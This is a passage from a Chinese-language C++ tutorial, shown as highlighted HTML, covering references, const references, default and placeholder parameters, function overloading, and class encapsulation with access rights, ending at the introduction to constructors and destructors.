class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//不能返回局部变量的引用</span></span><br><span class="line">	<span class="type">int</span>&amp; ref = <span class="built_in">test01</span>();</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;ref = &quot;</span> &lt;&lt; ref &lt;&lt; endl;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;ref = &quot;</span> &lt;&lt; ref &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//如果函数做左值，那么必须返回引用</span></span><br><span class="line">	<span class="type">int</span>&amp; ref2 = <span class="built_in">test02</span>();</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;ref2 = &quot;</span> &lt;&lt; ref2 &lt;&lt; endl;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;ref2 = &quot;</span> &lt;&lt; ref2 &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">test02</span>() = <span class="number">1000</span>;</span><br><span class="line"></span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;ref2 = &quot;</span> &lt;&lt; ref2 &lt;&lt; endl;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;ref2 = &quot;</span> &lt;&lt; ref2 &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>





<p>​	</p>
<h3 id="2-5-引用的本质"><a href="#2-5-引用的本质" class="headerlink" title="2.5 引用的本质"></a>2.5 引用的本质</h3><p>本质：<strong>引用的本质在c++内部实现是一个指针常量.</strong></p>
<p>讲解示例：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//发现是引用，转换为 int* const ref = &amp;a;</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">func</span><span class="params">(<span class="type">int</span>&amp; ref)</span></span>&#123;</span><br><span class="line">	ref = <span class="number">100</span>; <span class="comment">// ref是引用，转换为*ref = 100</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="type">int</span> a = <span class="number">10</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//自动转换为 int* const ref = &amp;a; 指针常量是指针指向不可改，也说明为什么引用不可更改</span></span><br><span class="line">	<span class="type">int</span>&amp; ref = a; </span><br><span class="line">	ref = <span class="number">20</span>; <span class="comment">//内部发现ref是引用，自动帮我们转换为: *ref = 20;</span></span><br><span class="line">    </span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;a:&quot;</span> &lt;&lt; a &lt;&lt; endl;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;ref:&quot;</span> &lt;&lt; ref &lt;&lt; endl;</span><br><span class="line">    </span><br><span class="line">	<span class="built_in">func</span>(a);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>结论：C++推荐用引用技术，因为语法方便，引用本质是指针常量，但是所有的指针操作编译器都帮我们做了</p>
<h3 id="2-6-常量引用"><a href="#2-6-常量引用" class="headerlink" title="2.6 常量引用"></a>2.6 常量引用</h3><p><strong>作用：</strong>常量引用主要用来修饰形参，防止误操作</p>
<p>在函数形参列表中，可以加&#x3D;&#x3D;const修饰形参&#x3D;&#x3D;，防止形参改变实参</p>
<p><strong>示例：</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//引用使用的场景，通常用来修饰形参</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">showValue</span><span class="params">(<span class="type">const</span> <span class="type">int</span>&amp; v)</span> </span>&#123;</span><br><span class="line">	<span class="comment">//v += 10;</span></span><br><span class="line">	cout &lt;&lt; v &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//int&amp; ref = 10;  引用本身需要一个合法的内存空间，因此这行错误</span></span><br><span class="line">	<span class="comment">//加入const就可以了，编译器优化代码，int temp = 10; const int&amp; ref = temp;</span></span><br><span class="line">	<span class="type">const</span> <span class="type">int</span>&amp; ref = <span class="number">10</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//ref = 100;  //加入const后不可以修改变量</span></span><br><span class="line">	cout &lt;&lt; ref &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//函数中利用常量引用防止误操作修改实参</span></span><br><span class="line">	<span class="type">int</span> a = <span class="number">10</span>;</span><br><span class="line">	<span class="built_in">showValue</span>(a);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>









<h2 id="3-函数提高"><a href="#3-函数提高" class="headerlink" title="3 函数提高"></a>3 函数提高</h2><h3 id="3-1-函数默认参数"><a href="#3-1-函数默认参数" class="headerlink" title="3.1 函数默认参数"></a>3.1 函数默认参数</h3><p>在C++中，函数的形参列表中的形参是可以有默认值的。</p>
<p>语法：<code> 返回值类型  函数名 （参数= 默认值）&#123;&#125;</code></p>
<p><strong>示例：</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">func</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b = <span class="number">10</span>, <span class="type">int</span> c = <span class="number">10</span>)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">return</span> a + b + c;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//1. 如果某个位置参数有默认值，那么从这个位置往后，从左向右，必须都要有默认值</span></span><br><span class="line"><span class="comment">//2. 如果函数声明有默认值，函数实现的时候就不能有默认参数</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">func2</span><span class="params">(<span class="type">int</span> a = <span class="number">10</span>, <span class="type">int</span> b = <span class="number">10</span>)</span></span>;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">func2</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">return</span> a + b;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;ret = &quot;</span> &lt;&lt; <span class="built_in">func</span>(<span class="number">20</span>, <span class="number">20</span>) &lt;&lt; endl;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;ret = &quot;</span> &lt;&lt; <span class="built_in">func</span>(<span class="number">100</span>) &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>







<h3 id="3-2-函数占位参数"><a href="#3-2-函数占位参数" class="headerlink" title="3.2 函数占位参数"></a>3.2 函数占位参数</h3><p>C++中函数的形参列表里可以有占位参数，用来做占位，调用函数时必须填补该位置</p>
<p><strong>语法：</strong> <code>返回值类型 函数名 (数据类型)&#123;&#125;</code></p>
<p>在现阶段函数的占位参数存在意义不大，但是后面的课程中会用到该技术</p>
<p><strong>示例：</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//函数占位参数 ，占位参数也可以有默认参数</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">func</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span>)</span> </span>&#123;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;this is func&quot;</span> &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">func</span>(<span class="number">10</span>,<span class="number">10</span>); <span class="comment">//占位参数必须填补</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>









<h3 id="3-3-函数重载"><a href="#3-3-函数重载" class="headerlink" title="3.3 函数重载"></a>3.3 函数重载</h3><h4 id="3-3-1-函数重载概述"><a href="#3-3-1-函数重载概述" class="headerlink" title="3.3.1 函数重载概述"></a>3.3.1 函数重载概述</h4><p><strong>作用：</strong>函数名可以相同，提高复用性</p>
<p><strong>函数重载满足条件：</strong></p>
<ul>
<li>同一个作用域下</li>
<li>函数名称相同</li>
<li>函数参数<strong>类型不同</strong>  或者 <strong>个数不同</strong> 或者 <strong>顺序不同</strong></li>
</ul>
<p><strong>注意:</strong>  函数的返回值不可以作为函数重载的条件</p>
<p><strong>示例：</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//函数重载需要函数都在同一个作用域下</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">func</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;func 的调用！&quot;</span> &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">func</span><span class="params">(<span class="type">int</span> a)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;func (int a) 的调用！&quot;</span> &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">func</span><span class="params">(<span class="type">double</span> a)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;func (double a)的调用！&quot;</span> &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">func</span><span class="params">(<span class="type">int</span> a ,<span class="type">double</span> b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;func (int a ,double b) 的调用！&quot;</span> &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">func</span><span class="params">(<span class="type">double</span> a ,<span class="type">int</span> b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;func (double a ,int b)的调用！&quot;</span> &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//函数返回值不可以作为函数重载条件</span></span><br><span class="line"><span class="comment">//int func(double a, int b)</span></span><br><span class="line"><span class="comment">//&#123;</span></span><br><span class="line"><span class="comment">//	cout &lt;&lt; &quot;func (double a ,int b)的调用！&quot; &lt;&lt; endl;</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">func</span>();</span><br><span class="line">	<span class="built_in">func</span>(<span class="number">10</span>);</span><br><span class="line">	<span class="built_in">func</span>(<span class="number">3.14</span>);</span><br><span class="line">	<span class="built_in">func</span>(<span class="number">10</span>,<span class="number">3.14</span>);</span><br><span class="line">	<span class="built_in">func</span>(<span class="number">3.14</span> , <span class="number">10</span>);</span><br><span class="line">	</span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>













<h4 id="3-3-2-函数重载注意事项"><a href="#3-3-2-函数重载注意事项" class="headerlink" title="3.3.2 函数重载注意事项"></a>3.3.2 函数重载注意事项</h4><ul>
<li>引用作为重载条件</li>
<li>函数重载碰到函数默认参数</li>
</ul>
<p><strong>示例：</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//函数重载注意事项</span></span><br><span class="line"><span class="comment">//1、引用作为重载条件</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">func</span><span class="params">(<span class="type">int</span> &amp;a)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;func (int &amp;a) 调用 &quot;</span> &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">func</span><span class="params">(<span class="type">const</span> <span class="type">int</span> &amp;a)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;func (const int &amp;a) 调用 &quot;</span> &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//2、函数重载碰到函数默认参数</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">func2</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b = <span class="number">10</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;func2(int a, int b = 10) 调用&quot;</span> &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">func2</span><span class="params">(<span class="type">int</span> a)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;func2(int a) 调用&quot;</span> &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	</span><br><span class="line">	<span class="type">int</span> a = <span class="number">10</span>;</span><br><span class="line">	<span class="built_in">func</span>(a); <span class="comment">//调用无const</span></span><br><span class="line">	<span class="built_in">func</span>(<span class="number">10</span>);<span class="comment">//调用有const</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="comment">//func2(10); //碰到默认参数产生歧义，需要避免</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>







<h2 id="4-类和对象"><a href="#4-类和对象" class="headerlink" title="4 类和对象"></a><strong>4</strong> 类和对象</h2><p>C++面向对象的三大特性为：&#x3D;&#x3D;封装、继承、多态&#x3D;&#x3D;</p>
<p>C++认为&#x3D;&#x3D;万事万物都皆为对象&#x3D;&#x3D;，对象上有其属性和行为</p>
<p><strong>例如：</strong></p>
<p>​	人可以作为对象，属性有姓名、年龄、身高、体重…，行为有走、跑、跳、吃饭、唱歌…</p>
<p>​	车也可以作为对象，属性有轮胎、方向盘、车灯…,行为有载人、放音乐、放空调…</p>
<p>​	具有相同性质的&#x3D;&#x3D;对象&#x3D;&#x3D;，我们可以抽象称为&#x3D;&#x3D;类&#x3D;&#x3D;，人属于人类，车属于车类</p>
<h3 id="4-1-封装"><a href="#4-1-封装" class="headerlink" title="4.1 封装"></a>4.1 封装</h3><h4 id="4-1-1-封装的意义"><a href="#4-1-1-封装的意义" class="headerlink" title="4.1.1  封装的意义"></a>4.1.1  封装的意义</h4><p>封装是C++面向对象三大特性之一</p>
<p>封装的意义：</p>
<ul>
<li>将属性和行为作为一个整体，表现生活中的事物</li>
<li>将属性和行为加以权限控制</li>
</ul>
<p><strong>封装意义一：</strong></p>
<p>​	在设计类的时候，属性和行为写在一起，表现事物</p>
<p><strong>语法：</strong> <code>class 类名&#123;   访问权限： 属性  / 行为  &#125;;</code></p>
<p><strong>示例1：</strong>设计一个圆类，求圆的周长</p>
<p><strong>示例代码：</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//圆周率</span></span><br><span class="line"><span class="type">const</span> <span class="type">double</span> PI = <span class="number">3.14</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//1、封装的意义</span></span><br><span class="line"><span class="comment">//将属性和行为作为一个整体，用来表现生活中的事物</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//封装一个圆类，求圆的周长</span></span><br><span class="line"><span class="comment">//class代表设计一个类，后面跟着的是类名</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Circle</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:  <span class="comment">//访问权限  公共的权限</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">//属性</span></span><br><span class="line">	<span class="type">int</span> m_r;<span class="comment">//半径</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">//行为</span></span><br><span class="line">	<span class="comment">//获取到圆的周长</span></span><br><span class="line">	<span class="function"><span class="type">double</span> <span class="title">calculateZC</span><span class="params">()</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="comment">//2 * pi  * r</span></span><br><span class="line">		<span class="comment">//获取圆的周长</span></span><br><span class="line">		<span class="keyword">return</span>  <span class="number">2</span> * PI * m_r;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//通过圆类，创建圆的对象</span></span><br><span class="line">	<span class="comment">// c1就是一个具体的圆</span></span><br><span class="line">	Circle c1;</span><br><span class="line">	c1.m_r = <span class="number">10</span>; <span class="comment">//给圆对象的半径 进行赋值操作</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">//2 * pi * 10 = = 62.8</span></span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;圆的周长为： &quot;</span> &lt;&lt; c1.<span class="built_in">calculateZC</span>() &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>





<p><strong>示例2：</strong>设计一个学生类，属性有姓名和学号，可以给姓名和学号赋值，可以显示学生的姓名和学号</p>
<p><strong>示例2代码：</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//学生类</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Student</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="function"><span class="type">void</span> <span class="title">setName</span><span class="params">(string name)</span> </span>&#123;</span><br><span class="line">		m_name = name;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="type">void</span> <span class="title">setID</span><span class="params">(<span class="type">int</span> id)</span> </span>&#123;</span><br><span class="line">		m_id = id;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="type">void</span> <span class="title">showStudent</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;name:&quot;</span> &lt;&lt; m_name &lt;&lt; <span class="string">&quot; ID:&quot;</span> &lt;&lt; m_id &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	string m_name;</span><br><span class="line">	<span class="type">int</span> m_id;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	Student stu;</span><br><span class="line">	stu.<span class="built_in">setName</span>(<span class="string">&quot;德玛西亚&quot;</span>);</span><br><span class="line">	stu.<span class="built_in">setID</span>(<span class="number">250</span>);</span><br><span class="line">	stu.<span class="built_in">showStudent</span>();</span><br><span class="line"></span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>









<p><strong>封装意义二：</strong></p>
<p>类在设计时，可以把属性和行为放在不同的权限下，加以控制</p>
<p>访问权限有三种：</p>
<ol>
<li>public        公共权限  </li>
<li>protected 保护权限</li>
<li>private      私有权限</li>
</ol>
<p><strong>示例：</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//三种权限</span></span><br><span class="line"><span class="comment">//公共权限  public     类内可以访问  类外可以访问</span></span><br><span class="line"><span class="comment">//保护权限  protected  类内可以访问  类外不可以访问</span></span><br><span class="line"><span class="comment">//私有权限  private    类内可以访问  类外不可以访问</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment">//姓名  公共权限</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	string m_Name;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//汽车  保护权限</span></span><br><span class="line"><span class="keyword">protected</span>:</span><br><span class="line">	string m_Car;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//银行卡密码  私有权限</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">	<span class="type">int</span> m_Password;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="function"><span class="type">void</span> <span class="title">func</span><span class="params">()</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		m_Name = <span class="string">&quot;张三&quot;</span>;</span><br><span class="line">		m_Car = <span class="string">&quot;拖拉机&quot;</span>;</span><br><span class="line">		m_Password = <span class="number">123456</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	Person p;</span><br><span class="line">	p.m_Name = <span class="string">&quot;李四&quot;</span>;</span><br><span class="line">	<span class="comment">//p.m_Car = &quot;奔驰&quot;;  //保护权限类外访问不到</span></span><br><span class="line">	<span class="comment">//p.m_Password = 123; //私有权限类外访问不到</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>







<h4 id="4-1-2-struct和class区别"><a href="#4-1-2-struct和class区别" class="headerlink" title="4.1.2 struct和class区别"></a>4.1.2 struct和class区别</h4><p>在C++中 struct和class唯一的<strong>区别</strong>就在于 <strong>默认的访问权限不同</strong></p>
<p>区别：</p>
<ul>
<li>struct 默认权限为公共</li>
<li>class   默认权限为私有</li>
</ul>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">C1</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">int</span>  m_A; <span class="comment">//默认是私有权限</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">C2</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">int</span> m_A;  <span class="comment">//默认是公共权限</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	C1 c1;</span><br><span class="line">	c1.m_A = <span class="number">10</span>; <span class="comment">//错误，访问权限是私有</span></span><br><span class="line"></span><br><span class="line">	C2 c2;</span><br><span class="line">	c2.m_A = <span class="number">10</span>; <span class="comment">//正确，访问权限是公共</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>













<h4 id="4-1-3-成员属性设置为私有"><a href="#4-1-3-成员属性设置为私有" class="headerlink" title="4.1.3 成员属性设置为私有"></a>4.1.3 成员属性设置为私有</h4><p><strong>优点1：</strong>将所有成员属性设置为私有，可以自己控制读写权限</p>
<p><strong>优点2：</strong>对于写权限，我们可以检测数据的有效性</p>
<p><strong>示例：</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"></span><br><span class="line">	<span class="comment">//姓名设置可读可写</span></span><br><span class="line">	<span class="function"><span class="type">void</span> <span class="title">setName</span><span class="params">(string name)</span> </span>&#123;</span><br><span class="line">		m_Name = name;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function">string <span class="title">getName</span><span class="params">()</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="keyword">return</span> m_Name;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="comment">//获取年龄 </span></span><br><span class="line">	<span class="function"><span class="type">int</span> <span class="title">getAge</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> m_Age;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//设置年龄</span></span><br><span class="line">	<span class="function"><span class="type">void</span> <span class="title">setAge</span><span class="params">(<span class="type">int</span> age)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">if</span> (age &lt; <span class="number">0</span> || age &gt; <span class="number">150</span>) &#123;</span><br><span class="line">			cout &lt;&lt; <span class="string">&quot;你个老妖精!&quot;</span> &lt;&lt; endl;</span><br><span class="line">			<span class="keyword">return</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		m_Age = age;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//情人设置为只写</span></span><br><span class="line">	<span class="function"><span class="type">void</span> <span class="title">setLover</span><span class="params">(string lover)</span> </span>&#123;</span><br><span class="line">		m_Lover = lover;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">	string m_Name; <span class="comment">//可读可写  姓名</span></span><br><span class="line">	</span><br><span class="line">	<span class="type">int</span> m_Age; <span class="comment">//只读  年龄</span></span><br><span class="line"></span><br><span class="line">	string m_Lover; <span class="comment">//只写  情人</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	Person p;</span><br><span class="line">	<span class="comment">//姓名设置</span></span><br><span class="line">	p.<span class="built_in">setName</span>(<span class="string">&quot;张三&quot;</span>);</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;姓名： &quot;</span> &lt;&lt; p.<span class="built_in">getName</span>() &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//年龄设置</span></span><br><span class="line">	p.<span class="built_in">setAge</span>(<span class="number">50</span>);</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;年龄： &quot;</span> &lt;&lt; p.<span class="built_in">getAge</span>() &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//情人设置</span></span><br><span class="line">	p.<span class="built_in">setLover</span>(<span class="string">&quot;苍井&quot;</span>);</span><br><span class="line">	<span class="comment">//cout &lt;&lt; &quot;情人： &quot; &lt;&lt; p.m_Lover &lt;&lt; endl;  //只写属性，不可以读取</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>









<p><strong>练习案例1：设计立方体类</strong></p>
<p>设计立方体类(Cube)</p>
<p>求出立方体的面积和体积</p>
<p>分别用全局函数和成员函数判断两个立方体是否相等。</p>












<p><strong>练习案例2：点和圆的关系</strong></p>
<p>设计一个圆形类（Circle），和一个点类（Point），计算点和圆的关系。</p>








<h3 id="4-2-对象的初始化和清理"><a href="#4-2-对象的初始化和清理" class="headerlink" title="4.2 对象的初始化和清理"></a>4.2 对象的初始化和清理</h3><ul>
<li>生活中我们买的电子产品都基本会有出厂设置，在某一天我们不用时候也会删除一些自己信息数据保证安全</li>
<li>C++中的面向对象来源于生活，每个对象也都会有初始设置以及 对象销毁前的清理数据的设置。</li>
</ul>
<h4 id="4-2-1-构造函数和析构函数"><a href="#4-2-1-构造函数和析构函数" class="headerlink" title="4.2.1 构造函数和析构函数"></a>4.2.1 构造函数和析构函数</h4><p>对象的<strong>初始化和清理</strong>也是两个非常重要的安全问题</p>
<p>​	一个对象或者变量没有初始状态，对其使用后果是未知</p>
<p>​	同样的使用完一个对象或变量，没有及时清理，也会造成一定的安全问题</p>
<p>c++利用了<strong>构造函数</strong>和<strong>析构函数</strong>解决上述问题，这两个函数将会被编译器自动调用，完成对象初始化和清理工作。</p>
